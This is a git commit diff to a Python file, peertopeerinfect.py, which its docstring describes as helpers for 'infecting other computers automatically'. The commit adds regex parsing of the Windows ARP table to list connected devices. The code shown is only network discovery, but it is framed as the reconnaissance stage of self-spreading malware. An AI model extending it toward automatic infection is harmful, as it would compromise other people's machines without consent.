be9ff0de088746e274e138c3454979ba5c800b2b
sunset-hue <sunsetree@proton.me>
2025-06-22 19:49:42 -0700

    finished up parsing with regex i found on stackoverflow

--- takoyaki/peertopeerinfect.py
+++ takoyaki/peertopeerinfect.py
@@ -1,10 +1,17 @@
 """Helper functions for infecting other computers automatically."""
 
 import subprocess
-import scapy.all as scapy
+import re
 
 
 def FormatARPTable():
     connected = subprocess.getoutput(["arp","-a"])
     # uses arp (windows tool) to get all connected devices, but needs checking
     # below this comment is formatting code to format all stuff into list
+    formatted = {}
+    for line in re.findall('([-.0-9]+)\\s+([-0-9a-f]{17})\\s+(\\w+)',connected):
+        # regex from this link on StackOverflow: https://stackoverflow.com/questions/59857314/how-can-i-get-the-arp-table-from-a-windows-machine-using-python
+        formatted[line[0]] = line[1],line[2]
+    return formatted
+
+print(FormatARPTable())
